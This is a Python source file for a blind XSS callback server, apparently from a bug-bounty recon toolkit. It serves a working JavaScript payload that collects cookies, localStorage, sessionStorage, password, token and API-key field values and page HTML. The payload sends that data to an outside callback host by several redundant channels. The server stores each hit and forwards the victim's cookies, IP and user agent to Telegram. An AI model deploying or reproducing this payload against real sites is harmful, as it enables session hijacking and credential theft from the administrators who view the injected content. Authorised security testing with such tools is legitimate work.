#!/usr/bin/env python3
"""
core/blindxss_server.py — Servidor persistente de Blind XSS callbacks

Endpoints:
  GET  /{payload_id}.js   → sirve el payload JS de captura
  GET  /c?d=<base64>      → recibe callback del payload disparado
  POST /c                 → recibe callback (body JSON base64 o raw JSON)
  GET  /health            → healthcheck

Inicia como servicio con: blindxss/start_listener.sh
O directamente:           python3 core/blindxss_server.py

Vars de entorno (config.env):
  BXSS_PORT           Puerto del servidor (default: 8080)
  BXSS_CALLBACK_HOST  URL pública del servidor (https://xss.tudominio.com)
  RECONFLOW_DB        Path a recon.db
  TELEGRAM_BOT_TOKEN  Token del bot
  TELEGRAM_CHAT_ID    Chat ID destino
  EZXSS_URL           (Opcional) EZXSS como fallback de polling
  EZXSS_ADMIN_PASS    (Opcional) Password EZXSS
"""

import os
import sys
import json
import re
import base64
import sqlite3
import threading
import time
import logging
from pathlib import Path
from datetime import datetime
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs, unquote
from urllib.request import urlopen, Request
from urllib.error import URLError

# ── Config ────────────────────────────────────────────────────
BASE_DIR        = Path(__file__).parent.parent
DB_PATH         = os.environ.get("RECONFLOW_DB",    str(BASE_DIR / "data" / "recon.db"))
BXSS_PORT       = int(os.environ.get("BXSS_PORT",   "8080"))
CALLBACK_HOST   = os.environ.get("BXSS_CALLBACK_HOST", "").rstrip("/")
TELEGRAM_BOT    = os.environ.get("TELEGRAM_BOT_TOKEN", "")
TELEGRAM_CHAT   = os.environ.get("TELEGRAM_CHAT_ID",   "")
EZXSS_URL       = os.environ.get("EZXSS_URL",  "")
EZXSS_PASS      = os.environ.get("EZXSS_ADMIN_PASS", "")
POLL_INTERVAL   = int(os.environ.get("BLINDXSS_POLL_INTERVAL", "300"))

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [BXSS] %(levelname)s %(message)s",
    datefmt="%Y-%m-%d %H:%M:%S",
)
log = logging.getLogger("blindxss")

# ── Payload JS template ───────────────────────────────────────
# PAYLOAD_ID y CALLBACK_HOST se sustituyen al servir el .js
#
# Captura: cookies, localStorage, sessionStorage, URL, título, referrer,
#   dominio, campos password/token visibles, HTML del panel (truncado).
# Exfil: sendBeacon (survives page unload), fetch, XHR, img beacon,
#   retry diferido a 4s por si el primer intento fue bloqueado.
PAYLOAD_JS = r"""(function(){
  var _i='PAYLOAD_ID',_h='CALLBACK_HOST';
  var _g=function(s){try{return s}catch(e){return ''}};
  var _ls='';try{_ls=JSON.stringify(localStorage).substring(0,400)}catch(e){}
  var _ss='';try{_ss=JSON.stringify(sessionStorage).substring(0,400)}catch(e){}
  var _fs='';try{
    var _fi=document.querySelectorAll('input[type=password],input[name*=token],input[name*=key],input[name*=secret],input[name*=api]');
    for(var i=0;i<_fi.length;i++){_fs+=_fi[i].name+'='+_fi[i].value+';'}
  }catch(e){}
  var _html='';try{_html=document.documentElement.innerHTML.substring(0,1500)}catch(e){}
  var _metas='';try{
    var _m=document.querySelectorAll('meta[name],meta[property]');
    for(var i=0;i<Math.min(_m.length,8);i++){_metas+=(_m[i].name||_m[i].getAttribute('property'))+'='+_m[i].content+';'}
  }catch(e){}
  var _d=JSON.stringify({
    i:_i,
    u:document.location.href,
    c:document.cookie,
    t:document.title,
    r:document.referrer,
    o:document.domain,
    ls:_ls,
    ss:_ss,
    fs:_fs,
    m:_metas,
    html:_html
  });
  var _b=btoa(unescape(encodeURIComponent(_d)));
  var _u=_h+'/c?d='+_b;
  var _send=function(u){
    try{navigator.sendBeacon(u)}catch(e){}
    try{fetch(u,{mode:'no-cors',keepalive:true})}catch(e){}
    var x=new XMLHttpRequest();try{x.open('GET',u,true);x.withCredentials=false;x.send()}catch(e){}
    try{(new Image()).src=u}catch(e){}
  };
  _send(_u);
  setTimeout(function(){_send(_u+'&r=1')},4000);
})();
"""

# ── DB helpers ────────────────────────────────────────────────
def db_conn():
    conn = sqlite3.connect(DB_PATH, timeout=10)
    conn.row_factory = sqlite3.Row
    return conn

def get_payload_row(payload_id: str):
    with db_conn() as conn:
        try:
            return conn.execute(
                "SELECT * FROM blindxss_payloads WHERE payload_id=?",
                (payload_id,)
            ).fetchone()
        except Exception:
            return None

def mark_fired(payload_id: str, fired_from: str, fired_ip: str,
               fired_ua: str, fired_cookies: str, fired_dom: str):
    with db_conn() as conn:
        try:
            conn.execute(
                """UPDATE blindxss_payloads
                   SET fired=1, fired_at=CURRENT_TIMESTAMP,
                       fired_from=?, fired_ip=?, fired_ua=?,
                       fired_cookies=?, fired_dom=?
                   WHERE payload_id=? AND fired=0""",
                (fired_from, fired_ip, fired_ua,
                 fired_cookies, fired_dom, payload_id)
            )
            row = conn.execute(
                "SELECT * FROM blindxss_payloads WHERE payload_id=?",
                (payload_id,)
            ).fetchone()
            if row:
                conn.execute(
                    """INSERT OR IGNORE INTO findings
                       (domain_id, type, severity, target, template, detail)
                       VALUES(?,?,?,?,?,?)""",
                    (
                        row["domain_id"],
                        "blind_xss",
                        "high",
                        row["target_url"],
                        f"blindxss:{row['field_type']}:{row['field_name']}",
                        f"Blind XSS disparado desde {fired_from} "
                        f"| Campo: {row['field_name']} "
                        f"| IP admin: {fired_ip}",
                    )
                )
            conn.commit()
        except Exception as e:
            log.error(f"DB mark_fired error: {e}")

# ── Telegram ──────────────────────────────────────────────────
def telegram_send(msg: str):
    if not TELEGRAM_BOT or not TELEGRAM_CHAT:
        return
    try:
        payload = json.dumps({
            "chat_id":    TELEGRAM_CHAT,
            "text":       msg,
            "parse_mode": "Markdown",
        }).encode()
        req = Request(
            f"https://api.telegram.org/bot{TELEGRAM_BOT}/sendMessage",
            data=payload,
            headers={"Content-Type": "application/json"},
            method="POST",
        )
        urlopen(req, timeout=10)
    except Exception as e:
        log.warning(f"Telegram error: {e}")

# ── Callback processor ────────────────────────────────────────
def process_callback(payload_id: str, fired_from: str, fired_ip: str,
                     fired_ua: str, fired_cookies: str, fired_dom: str,
                     extra: str = ""):
    if not re.match(r'^[a-f0-9]{8}$', payload_id):
        log.warning(f"Invalid payload_id in callback: {payload_id!r}")
        return

    row = get_payload_row(payload_id)
    if not row:
        log.info(f"Callback for unknown payload_id: {payload_id}")
        return

    if row["fired"]:
        log.info(f"Payload {payload_id} already fired — ignoring duplicate")
        return

    log.warning(f"!!! BLIND XSS FIRED: {payload_id}")
    log.warning(f"    Campo: {row['field_name']} en {row['target_url']}")
    log.warning(f"    Desde: {fired_from}")
    log.warning(f"    IP: {fired_ip}  UA: {fired_ua[:60]}")

    dom_detail = f"{fired_dom} | {extra}" if extra else fired_dom
    mark_fired(payload_id, fired_from, fired_ip, fired_ua, fired_cookies, dom_detail[:600])

    try:
        subdomain = row["subdomain"]
        target    = row["target_url"] or ""
        field     = row["field_name"] or ""
        field_t   = row["field_type"] or ""
    except Exception:
        subdomain = target = field = field_t = "?"

    msg = (
        f"🎯🎯 *Blind XSS DISPARADO*\n"
        f"🌐 Dominio: `{subdomain}`\n"
        f"📝 Campo: `{field}` ({field_t})\n"
        f"🔗 Inyectado en: `{target[:80]}`\n"
        f"💥 Disparado desde: `{fired_from[:100]}`\n"
        f"🖥️ IP admin: `{fired_ip}`\n"
        f"🌐 UA admin: `{fired_ua[:80]}`\n"
        f"🍪 Cookies: `{fired_cookies[:100]}`\n"
        f"📅 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
    )
    threading.Thread(target=telegram_send, args=(msg,), daemon=True).start()

def decode_callback_data(raw: str) -> dict:
    """Decodifica base64url o base64 estándar de datos del callback."""
    raw = raw.strip()
    # Intentar con padding fijo
    for attempt in (raw, unquote(raw)):
        try:
            padded = attempt + "=" * (-len(attempt) % 4)
            decoded = base64.b64decode(padded).decode("utf-8", errors="replace")
            return json.loads(decoded)
        except Exception:
            pass
    return {}

# ── HTTP handler ──────────────────────────────────────────────
class BXSSHandler(BaseHTTPRequestHandler):
    server_version = "hackeadora-bxss/1.0"
    CORS_HEADERS = {
        "Access-Control-Allow-Origin":  "*",
        "Access-Control-Allow-Methods": "GET, POST, OPTIONS",
        "Access-Control-Allow-Headers": "Content-Type",
    }

    def _respond(self, status: int, content_type: str, body: bytes):
        self.send_response(status)
        self.send_header("Content-Type",   content_type)
        self.send_header("Content-Length", str(len(body)))
        for k, v in self.CORS_HEADERS.items():
            self.send_header(k, v)
        self.end_headers()
        self.wfile.write(body)

    def _dispatch_callback(self, raw_d: str):
        data = decode_callback_data(raw_d)
        if not data:
            return
        payload_id    = str(data.get("i", ""))
        fired_from    = str(data.get("u", ""))
        fired_cookies = str(data.get("c", ""))
        fired_dom     = str(data.get("t", ""))
        extra         = f"ls={data.get('ls','')[:200]} | origin={data.get('o','')}"
        fired_ip      = self.client_address[0]
        fired_ua      = self.headers.get("User-Agent", "")
        threading.Thread(
            target=process_callback,
            args=(payload_id, fired_from, fired_ip, fired_ua, fired_cookies, fired_dom, extra),
            daemon=True,
        ).start()

    def do_OPTIONS(self):
        self._respond(200, "text/plain", b"OK")

    def do_GET(self):
        parsed = urlparse(self.path)
        path   = parsed.path.rstrip("/") or "/"

        # ── Serve payload JS ──────────────────────────────────
        m = re.match(r'^/([a-f0-9]{8})\.js$', path)
        if m:
            pid = m.group(1)
            cb_host = CALLBACK_HOST or f"http://{self.headers.get('Host','localhost')}"
            js = PAYLOAD_JS.replace("PAYLOAD_ID", pid).replace("CALLBACK_HOST", cb_host)
            self._respond(200, "application/javascript; charset=utf-8", js.encode())
            return

        # ── Receive callback ──────────────────────────────────
        if path == "/c":
            qs  = parsed.query
            params = parse_qs(qs)
            raw_d  = params.get("d", [""])[0]
            if raw_d:
                self._dispatch_callback(raw_d)
            # Always 200 + 1px transparent GIF so img fallback works
            GIF = b"\x47\x49\x46\x38\x39\x61\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\x00\x00\x00\x21\xf9\x04\x00\x00\x00\x00\x00\x2c\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02\x44\x01\x00\x3b"
            self._respond(200, "image/gif", GIF)
            return

        # ── Health check ──────────────────────────────────────
        if path in ("/", "/health", "/ping"):
            status = json.dumps({"status": "ok", "ts": datetime.now().isoformat()}).encode()
            self._respond(200, "application/json", status)
            return

        self._respond(404, "text/plain", b"Not found")

    def do_POST(self):
        parsed = urlparse(self.path)
        path   = parsed.path.rstrip("/")

        if path == "/c":
            length = int(self.headers.get("Content-Length", 0))
            body   = self.rfile.read(length) if length else b""
            # Support raw JSON body or base64 in ?d= param
            qs     = parsed.query
            params = parse_qs(qs)
            raw_d  = params.get("d", [""])[0]
            if raw_d:
                self._dispatch_callback(raw_d)
            elif body:
                try:
                    data = json.loads(body.decode("utf-8", errors="replace"))
                    raw_d = data.get("d", "")
                    if raw_d:
                        self._dispatch_callback(raw_d)
                    else:
                        # Body is the JSON directly
                        payload_id    = str(data.get("i", ""))
                        fired_from    = str(data.get("u", ""))
                        fired_cookies = str(data.get("c", ""))
                        fired_dom     = str(data.get("t", ""))
                        extra         = f"origin={data.get('o','')}"
                        fired_ip      = self.client_address[0]
                        fired_ua      = self.headers.get("User-Agent", "")
                        threading.Thread(
                            target=process_callback,
                            args=(payload_id, fired_from, fired_ip, fired_ua,
                                  fired_cookies, fired_dom, extra),
                            daemon=True,
                        ).start()
                except Exception:
                    pass
            self._respond(200, "text/plain", b"OK")
            return

        self._respond(404, "text/plain", b"Not found")

    def log_message(self, fmt, *args):
        # Silenciar el log por defecto de BaseHTTPRequestHandler para las peticiones
        # normales. Solo loggear callbacks y payloads.
        path = args[0] if args else ""
        if "/c?" in str(path) or ".js" in str(path):
            log.info(f"{self.client_address[0]} - {fmt % args}")

# ── EZXSS polling fallback (background thread) ────────────────
def _ezxss_poll_loop():
    """Polling de EZXSS como fallback. Usa requests si está disponible."""
    if not EZXSS_URL or not EZXSS_PASS:
        return
    log.info(f"EZXSS polling activo cada {POLL_INTERVAL}s ({EZXSS_URL})")
    # Importar blindxss_callback para reutilizar el cliente EZXSS
    try:
        sys.path.insert(0, str(BASE_DIR / "core"))
        from blindxss_callback import process_ezxss_reports
        while True:
            try:
                n = process_ezxss_reports()
                if n:
                    log.warning(f"EZXSS: {n} payloads procesados")
            except Exception as e:
                log.warning(f"EZXSS poll error: {e}")
            time.sleep(POLL_INTERVAL)
    except ImportError:
        log.warning("blindxss_callback no disponible — EZXSS polling desactivado")

# ── Main ──────────────────────────────────────────────────────
def main():
    if not CALLBACK_HOST:
        log.warning(
            "BXSS_CALLBACK_HOST no configurado — "
            "los payloads usarán el Host header del request (HTTP only). "
            "Para HTTPS configura BXSS_CALLBACK_HOST=https://xss.tudominio.com"
        )

    # Hilo de EZXSS polling
    t = threading.Thread(target=_ezxss_poll_loop, daemon=True)
    t.start()

    server = HTTPServer(("0.0.0.0", BXSS_PORT), BXSSHandler)
    log.info(f"Blind XSS listener iniciado en 0.0.0.0:{BXSS_PORT}")
    log.info(f"Callback host: {CALLBACK_HOST or '(auto desde Host header)'}")
    log.info(f"DB: {DB_PATH}")

    try:
        server.serve_forever()
    except KeyboardInterrupt:
        log.info("Servidor detenido.")
        server.server_close()

if __name__ == "__main__":
    main()
